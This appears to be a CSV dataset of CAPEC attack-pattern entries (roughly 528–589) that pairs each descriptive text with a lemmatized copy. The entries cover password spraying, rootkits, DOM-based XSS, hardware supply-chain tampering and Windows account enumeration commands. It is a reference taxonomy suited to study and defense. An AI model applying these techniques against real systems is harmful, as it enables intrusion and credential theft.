CAPEC-528,XML Flood,"An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.",adversary execute flood attack xml message intent deny legitimate user access web service attack accomplish send large number xml base request let service attempt parse case type attack result xml denial service xdos application unstable freeze crash xdos closely associate web service soap rest remote service requester post malicious xml payload service provider design exhaust service provider memory cpu disk space main weakness xdos service provider generally inspect parse validate xml message determine routing workflow security consideration exactly inspection parsing validation routine xdos target attack exploit loosely couple nature web service service provider little control service requester message service requester send
CAPEC-529,Malware-Directed Internal Reconnaissance,"Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.",adversary use malware similarly control application instal inside organizational perimeter gather information composition configuration security mechanism target application system network
CAPEC-53,"Postfix, Null Terminate, and Backslash","If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an adversary to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.",string pass filter kind terminal null valid alternate representation null allow adversary embed null mid string postfixe proper datum filter avoid example filter look trail slash character string insertion possible slash exist alternate encoding null mid string
CAPEC-530,Provide Counterfeit Component,"An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.",attacker provide counterfeit component procurement process low tier component supplier sub system developer integrator build system upgrade repair victim allow attacker cause disruption additional compromise
CAPEC-531,Hardware Component Substitution,"An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.",attacker substitute test approve hardware component maliciously alter hardware component type attack carry directly system enable attacker cause disruption additional compromise
CAPEC-532,Altered Installed BIOS,"An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.",attacker access download update system software send maliciously alter bios victim victim supplier integrator instal allow future exploitation
CAPEC-533,Malicious Manual Software Update,"An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in their arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.",attacker introduce malicious code victim system alter payload software update allow additional compromise site disruption victim location manual user assist attack vary require user download run executable streamlined trick user click url attack aim penetrate specific network infrastructure rely secondary attack method achieve desire impact spamming example common method employ secondary attack vector attacker arsenal choice initial attack vector range traditional smtp pop imap spamming variety web application mechanism commonly implement chat rich html messaging user interface
CAPEC-534,Malicious Hardware Update,"An adversary introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an adversary can leverage known defects to obtain a desired malicious impact.",adversary introduce malicious hardware update replacement procedure allow additional compromise site disruption victim location deployment uncommon upgrade replacement occur involve hardware replaceable part upgrade replacement intend correct defect provide additional feature replace broken wear part force trick replacement good component defective corrupted component adversary leverage known defect obtain desire malicious impact
CAPEC-535,Malicious Gray Market Hardware,"An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.",attacker maliciously alter hardware component sell gray market allow victim disruption compromise victim need replacement hardware component system part long regular supply original supplier hardware component attacker great benefit cost perspective
CAPEC-536,Data Injected During Configuration,"An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.",attacker access data file process victim system inject malicious datum critical operational datum configuration recalibration cause victim system perform suboptimal manner benefit adversary
CAPEC-537,Infiltration of Hardware Development Environment,"An adversary, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.",adversary leverage ability manipulate component primary support system tool development production environment insert malicious software hardware firmware development environment infiltration purpose alter develop hardware component system destine deployment victim organization purpose disruption compromise
CAPEC-538,Open-Source Library Manipulation,"Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed, as OSS is commonly downloaded by developers and other users to incorporate into software development projects. The adversary can have a particular system in mind to target, or the implantation can be the first stage of follow-on attacks on many systems.",adversary implant malicious code open source software oss library widely distribute oss commonly download developer user incorporate software development project adversary particular system mind target implantation stage follow attack system
CAPEC-539,ASIC With Malicious Functionality,An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.,attacker access development environment process application specific integrated circuit asic victim system develop maintain initial deployment insert malicious functionality system purpose disruption compromise
CAPEC-54,Query System for Information,"An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.",adversary aware application location possibly authorize use application probe application structure evaluate robustness submit request examine response accomplish send variant expected query hope modify query return information expected set query provide
CAPEC-540,Overread Buffers,"An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.",adversary attack target provide input cause application read boundary define buffer typically occur value influence start stop read set reflect position outside valid memory location buffer type attack result exposure sensitive information system crash arbitrary code execution
CAPEC-541,Application Fingerprinting,An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.,adversary engage fingerprinting activity determine type version application instal remote target
CAPEC-542,Targeted Malware,An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.,adversary develop target malware take advantage know vulnerability organizational information technology environment malware craft attack base specifically information gather technology environment successfully execute malware enable adversary achieve wide variety negative technical impact
CAPEC-543,Counterfeit Websites,"Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.",adversary create duplicate legitimate website user visit counterfeit site site gather information upload malware
CAPEC-544,Counterfeit Organizations,An adversary creates a false front organizations with the appearance of a legitimate supplier in the critical life cycle path that then injects corrupted/malicious information system components into the organizational supply chain.,adversary create false organization appearance legitimate supplier critical life cycle path inject corrupted malicious information system component organizational supply chain
CAPEC-545,Pull Data from System Resources,"An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.",adversary authorize ability search know system resource intention gather useful information system resource include file memory aspect target system pattern attack adversary necessarily know go find start pull datum different adversary know look common location
CAPEC-546,Incomplete Data Deletion in a Multi-Tenant Environment,"An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there.",adversary obtain unauthorized information insecure incomplete datum deletion multi tenant environment cloud provider fail completely delete storage datum cloud tenant system resource resource allocate new potentially malicious tenant probe provide resource sensitive information
CAPEC-547,Physical Destruction of Device or Component,"An adversary conducts a physical attack a device or component, destroying it such that it no longer functions as intended.",adversary conduct physical attack device component destroy long function intend
CAPEC-548,Contaminate Resource,"An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. When this happens, the contaminated information system, device, or network must be brought offline to investigate and mitigate the data spill, which denies availability of the system until the investigation is complete.Contamination through email is a very common attack vector. Systems with email servers or personal work systems using email are susceptible to this attack simply by receiving an email that contains a classified document or information. A fake classified document could even be used that is mistaken as true classified material. This would still cause the system to be taken offline until the validity of the classified material is confirmed.",adversary contaminate organizational information system include device network cause handle information classification sensitivity authorize happen contaminate information system device network bring offline investigate mitigate data spill deny availability system investigation complete contamination email common attack vector system email server personal work system email susceptible attack simply receive email contain classified document information fake classified document mistake true classified material cause system take offline validity classified material confirm
CAPEC-549,Local Execution of Code,"An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.",adversary install execute malicious code target system effort achieve negative technical impact example include rootkit ransomware spyware adware
CAPEC-55,Rainbow Table Password Cracking,"An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table. Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt.",attacker get access database table hash password store use rainbow table pre computed hash chain attempt look original password original password correspond hash obtain attacker use original password gain access system password rainbow table store hash chain password password chain compute start original password p function r hash function recurrence relation exist hash chain length n original password p form xn p store rainbow table construct rainbow table take long time computationally expensive separate table need construct hash algorithm etc rainbow table compute effective crack password hash use salt
CAPEC-550,Install New Service,"When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.",operate system start start program call service daemon adversary install new service execute startup windows system modify registry service disguise related operate system benign software service usually run elevated privilege
CAPEC-551,Modify Existing Service,"When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.",operate system start start program call service daemon modify existing service break existing service enable service disabled commonly
CAPEC-552,Install Rootkit ,"An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.",adversary exploit weakness authentication install malware alter functionality information provide target operating system api call refer rootkit hide presence program file network connection service driver system component
CAPEC-554,Functionality Bypass,"An adversary attacks a system by bypassing some or all functionality intended to protect it. Often, a system user will think that protection is in place, but the functionality behind those protections has been disabled by the adversary.",adversary attack system bypass functionality intend protect system user think protection place functionality protection disable adversary
CAPEC-555,Remote Services with Stolen Credentials,"This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.",pattern attack involve adversary use steal credential leverage remote service rdp telnet ssh vnc log system access gain number malicious activity perform
CAPEC-556,Replace File Extension Handlers,"When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.",file open file handler check determine program open file file handler configuration property operate system application modify file handler give file extension arbitrary program file given extension open
CAPEC-558,Replace Trusted Executable,An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.,adversary exploit weakness privilege management access control replace trusted executable malicious version enable execution malware trusted executable call
CAPEC-559,Orbital Jamming,"In this attack pattern, the adversary sends disruptive signals at a target satellite using a rogue uplink station to disrupt the intended transmission. Those within the satellite's footprint are prevented from reaching the satellite's targeted or neighboring channels. The satellite's footprint size depends upon its position in the sky; higher orbital satellites cover multiple continents.",attack pattern adversary send disruptive signal target satellite rogue uplink station disrupt intended transmission satellite footprint prevent reach satellite target neighboring channel satellite footprint size depend position sky high orbital satellite cover multiple continent
CAPEC-560,Use of Known Domain Credentials,"An adversary guesses or obtains (i.e. steals or purchases) legitimate credentials (e.g. userID/password) to achieve authentication and to perform authorized actions under the guise of an authenticated user or service.Attacks leveraging trusted credentials typically result in the adversary laterally moving within the local network, since users are often allowed to login to systems/applications within the network using the same password. This further allows the adversary to obtain sensitive data, download/install malware on the system, pose as a legitimate user for social engineering purposes, and more.Attacks on known passwords generally rely on the primary fact that users often reuse the same username/password combination for a variety of systems, applications, and services, coupled with poor password policies on the target system or application. Adversaries can also utilize known passwords to target Single Sign On (SSO) or cloud-based applications and services, which often don't verify the authenticity of the user's input. Known credentials are usually obtained by an adversary via a system/application breach and/or by purchasing dumps of credentials on the dark web. These credentials may be further gleaned via exposed configuration and properties files that contain system passwords, database connection strings, and other sensitive data.",adversary guess obtain steal purchase legitimate credential userid password achieve authentication perform authorized action guise authenticated user service attack leverage trust credential typically result adversary laterally move local network user allow login system application network password allow adversary obtain sensitive datum download install malware system pose legitimate user social engineering purpose attack know password generally rely primary fact user reuse username password combination variety system application service couple poor password policy target system application adversary utilize know password target single sign sso cloud base application service verify authenticity user input known credential usually obtain adversary system application breach purchase dump credential dark web credential glean expose configuration property file contain system password database connection string sensitive datum
CAPEC-561,Windows Admin Shares with Stolen Credentials,"An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain.Windows systems within the Windows NT family contain hidden network shares that are only accessible to system administrators. These shares allow administrators to remotely access all disk volumes on a network-connected system and further allow for files to be copied, written, and executed, along with other administrative actions. Example network shares include: C$, ADMIN$ and IPC$. If an adversary is able to obtain legitimate Windows credentials, the hidden shares can be accessed remotely, via server message block (SMB) or the Net utility, to transfer files and execute code. It is also possible for adversaries to utilize NTLM hashes to access administrator shares on systems with certain configuration and patch levels.",adversary guess obtain steal purchase legitimate windows administrator credential userid password access windows admin shares local machine windows domain windows system windows nt family contain hide network share accessible system administrator share allow administrator remotely access disk volume network connect system allow file copy write execute administrative action example network share include adversary able obtain legitimate windows credential hide share access remotely server message block smb net utility transfer file execute code possible adversary utilize ntlm hash access administrator share system certain configuration patch level
CAPEC-562,Modify Shared File,"An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.",adversary manipulate file shared location add malicious program script exploit code valid content user open share content tainted content execute
CAPEC-563,Add Malicious File to Shared Webroot,"An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.",adversary add malicious content website open file share browse content web browser cause server execute content malicious content typically run context permission web server process result local system administrative privilege depend web server configure
CAPEC-564,Run Software at Logon,"Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.",operate system allow logon script run specific user user logon system adversary access script insert additional code logon script code allow maintain persistence laterally enclave execute time affect user user logon computer modify logon script effectively bypass workstation enclave firewall depend access configuration logon script local credential remote administrative account necessary
CAPEC-565,Password Spraying,"In a Password Spraying attack, an adversary tries a small list (e.g. 3-5) of common or expected passwords, often matching the target's complexity policy, against a known list of user accounts to gain valid credentials. The adversary tries a particular password for each user account, before moving onto the next password in the list. This approach assists the adversary in remaining undetected by avoiding rapid or frequent account lockouts. The adversary may then reattempt the process with additional passwords, once enough time has passed to prevent inducing a lockout.Password Spraying attacks often target management services over commonly used ports such as SSH, FTP, Telnet, LDAP, Kerberos, MySQL, and more. Additional targets include Single Sign-On (SSO) or cloud-based applications/services that utilize federated authentication protocols, and externally facing applications. Successful execution of Password Spraying attacks usually lead to lateral movement within the target, which allows the adversary to impersonate the victim or execute any action that the victim is authorized to perform. If the password chosen by the user is commonly used or easily guessed, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.Password Spraying Attacks are similar to Dictionary-based Password Attacks (CAPEC-16) in that they both leverage precompiled lists (i.e. dictionaries) of username/password combinations to try against a system/application. The primary difference is that Password Spraying Attacks leverage a known list of user accounts and only try one password for each account before moving onto the next password. In contrast, Dictionary-based Password Attacks leverage unknown username/password combinations and are often executed offline against files containing hashed credentials, where inducing an account lockout is not a concern.Password Spraying Attacks are also similar to Credential Stuffing attacks (CAPEC-600), since both utilize known user accounts and often attack the same targets. Credential Stuffing attacks, however, leverage known username/password combinations, whereas Password Spraying attacks have no insight into known username/password pairs. If a Password Spraying attack succeeds, it may additionally lead to Credential Stuffing attacks on different targets.",password spraying attack adversary try small list common expected password match target complexity policy know list user account gain valid credential adversary try particular password user account move password list approach assist adversary remain undetected avoid rapid frequent account lockout adversary reattempt process additional password time pass prevent induce lockout password spraying attack target management service commonly port ssh ftp telnet ldap kerberos mysql additional target include single sign sso cloud base application service utilize federated authentication protocol externally face application successful execution password spraying attack usually lead lateral movement target allow adversary impersonate victim execute action victim authorize perform password choose user commonly easily guess attack successful absence mitigation specific instance password brute forcing attack pattern password spraying attacks similar dictionary base password attacks leverage precompiled list dictionary username password combination try system application primary difference password spraying attacks leverage know list user account try password account move password contrast dictionary base password attacks leverage unknown username password combination execute offline file contain hashed credential induce account lockout concern password spraying attacks similar credential stuffing attack utilize know user account attack target credential stuffing attack leverage know username password combination password spraying attack insight know username password pair password spraying attack succeed additionally lead credential stuffing attack different target
CAPEC-568,Capture Credentials via Keylogger,"An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.",adversary deploy keylogger effort obtain credential directly system user capture keystroke user adversary analyze datum determine string likely password credential relate information
CAPEC-569,Collect Data as Provided by Users,"An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.",attacker leverage tool device program obtain specific information provide user target system information need attacker launch follow attack attack different social engineering adversary trick deceive user instead adversary put mechanism place capture information user legitimately enter system deploy keylogger perform uac prompt wrap windows default credential provider example interaction
CAPEC-57,Utilizing REST's Trust in the System Resource to Obtain Sensitive Data,"This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required.Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The adversary can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated. Once the adversary gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.",attack utilize state application trust system resource environment obtain sensitive datum ssl terminate rest application premise leverage exist infrastructure deliver web service functionality example rest application use http method receive http response xml document rest style web service deploy exist infrastructure apache iis web server soap stack require unfortunately security standpoint frequently interoperable identity security mechanism deploy rest developer fall ssl deliver security large data center ssl typically terminate edge network firewall load balancer router ssl terminate http request clear developer hash encrypt value rare adversary utilize sniffer wireshark snapshot credential username password pass clear ssl terminate adversary gather credential submit request web service provider authorized user typically authentication client pass request compromise generally sufficient compromise service authentication scheme
CAPEC-571,Block Logging to Central Repository,"An adversary prevents host-generated logs being delivered to a central location in an attempt to hide indicators of compromise.In the case of network based reporting of indicators, an adversary may block traffic associated with reporting to prevent central station analysis. This may be accomplished by many means such as stopping a local process to creating a host-based firewall rule to block traffic to a specific server.In the case of local based reporting of indicators, an adversary may block delivery of locally-generated log files themselves to the central repository.",adversary prevent host generate log deliver central location attempt hide indicator compromise case network base reporting indicator adversary block traffic associate reporting prevent central station analysis accomplish mean stop local process create host base firewall rule block traffic specific server case local base reporting indicator adversary block delivery locally generate log file central repository
CAPEC-572,Artificially Inflate File Sizes,An adversary modifies file contents by adding data to files for several reasons. Many different attacks could “follow” this pattern resulting in numerous outcomes. Adding data to a file could also result in a Denial of Service condition for devices with limited storage capacity.,adversary modify file content add datum file reason different attack follow pattern result numerous outcome add datum file result denial service condition device limited storage capacity
CAPEC-573,Process Footprinting,"An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.",adversary exploit functionality mean identify information currently run process target system authorized user know process run target system adversary learn target environment means malicious behavior
CAPEC-574,Services Footprinting,"An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include ""sc"" and ""tasklist/svc"" using Tasklist, and ""net start"" using Net.",adversary exploit functionality mean identify information service target system authorized user know service register target system adversary learn target environment means malicious behavior depend operate system command obtain service information include sc tasklist svc tasklist net start net
CAPEC-575,Account Footprinting,"An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: ""net user"" and ""dsquery"".",adversary exploit functionality mean identify information domain account permission target system authorized user know account register target system adversary inform target malicious behavior example windows command acquire information net user dsquery
CAPEC-576,Group Permission Footprinting,"An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is ""net localgroup"".",adversary exploit functionality mean identify information user group permission target system authorized user know user permission register target system adversary inform target malicious behavior example windows command list local group net localgroup
CAPEC-577,Owner Footprinting,"An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is ""dir /A ntuser.dat"". Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.",adversary exploit functionality mean identify information primary user target system authorized user example review login file modification time know owner use target system adversary inform target malicious behavior example windows command accomplish dir display modify time user file run root folder user time synonymous time user log
CAPEC-578,Disable Security Software,"An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.",adversary exploit weakness access control disable security tool detection occur form kill process delete registry key tool start run time delete log file method
CAPEC-579,Replace Winlogon Helper DLL,"Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.",winlogon windows perform logon action windows system prior windows vista registry key modify cause winlogon load dll startup adversary advantage feature load adversarial code startup
CAPEC-58,Restful Privilege Elevation,"An adversary identifies a Rest HTTP (Get, Put, Delete) style permission method allowing them to perform various malicious actions upon server data due to lack of access control mechanisms implemented within the application service accepting HTTP messages.Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.",adversary identify rest http delete style permission method allow perform malicious action server datum lack access control mechanism implement application service accept http message rest use standard http delete style permission method necessarily correlate generally end program strict interpretation http method mean http service delete information server access control mechanism logic mean service properly application service implementation follow guideline http request easily execute delete update server attacker identify http url updateorder call program update order database resource url idempotent request submit multiple time attacker additionally attacker able exploit url publish method actually perform update instead merely retrieve datum result malicious inadvertent altering datum server
CAPEC-580,System Footprinting,An adversary engages in active probing and exploration activities to determine security information about a remote target system. Often times adversaries will rely on remote applications that can be probed for system configurations.,adversary engage active probing exploration activity determine security information remote target system time adversary rely remote application probe system configuration
CAPEC-581,Security Software Footprinting,Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.,adversary attempt listing security tool instal system configuration include security relate system feature build firewall anti spyware party security software
CAPEC-582,Route Disabling,"An adversary disables the network route between two targets. The goal is to completely sever the communications channel between two entities. This is often the result of a major error or the use of an ""Internet kill switch"" by those in control of critical infrastructure. This attack pattern differs from most other obstruction patterns by targeting the route itself, as opposed to the data passed over the route.",adversary disable network route target goal completely sever communication channel entity result major error use internet kill switch control critical infrastructure attack pattern differ obstruction pattern target route oppose datum pass route
CAPEC-583,Disabling Network Hardware,"In this attack pattern, an adversary physically disables networking hardware by powering it down or disconnecting critical equipment. Disabling or shutting off critical system resources prevents them from performing their service as intended, which can have direct and indirect consequences on other systems. This attack pattern is considerably less technical than the selective blocking used in most obstruction attacks.",attack pattern adversary physically disable network hardware power disconnect critical equipment disable shut critical system resource prevent perform service intend direct indirect consequence system attack pattern considerably technical selective blocking obstruction attack
CAPEC-584,BGP Route Disabling,"An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.",adversary suppress border gateway protocol bgp advertisement route render underlying network inaccessible bgp protocol help traffic internet select efficient route autonomous systems routing domain bgp basis interdomain routing infrastructure provide connection ass suppress intended routing advertisement force effective route traffic ass adversary deny availability target network
CAPEC-585,DNS Domain Seizure,"In this attack pattern, an adversary influences a target's web-hosting company to disable a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.",attack pattern adversary influence target web host company disable target domain goal prevent access target service provide domain usually occur result civil criminal legal intervention
CAPEC-586,Object Injection,"An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.",adversary attempt exploit application inject additional malicious content processing serialize object developer leverage serialization order convert datum state static binary format save disk transfer network object deserialize need recover data state inject malformed object vulnerable application adversary potentially compromise application manipulate deserialization process result number unwanted outcome include remote code execution
CAPEC-587,Cross Frame Scripting (XFS),This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.,attack pattern combine malicious javascript legitimate webpage load conceal iframe malicious javascript able interact legitimate webpage manner unknown user attack usually leverage element social engineering attacker convince user visit web page attacker control
CAPEC-588,DOM-Based XSS,"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.",type attack form cross site scripting xss malicious script insert client html parse web browser content serve vulnerable web application include script code manipulate document object model dom script code properly validate input perform proper output encoding create opportunity adversary inject malicious script launch xss attack key distinction xss attack dom base attack xss attack malicious script run vulnerable web page initially load dom base attack execute page load distinction dom base attack case malicious script send vulnerable web server attack like guarantee bypass server filtering attempt protect user
CAPEC-589,DNS Blocking,"An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.",adversary intercept traffic intentionally drop dns request base content request way adversary deny availability specific service content user ip address change
CAPEC-59,Session Credential Falsification through Prediction,This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.,attack target predictable session id order gain privilege attacker predict session id transaction perform spoofing session hijacking
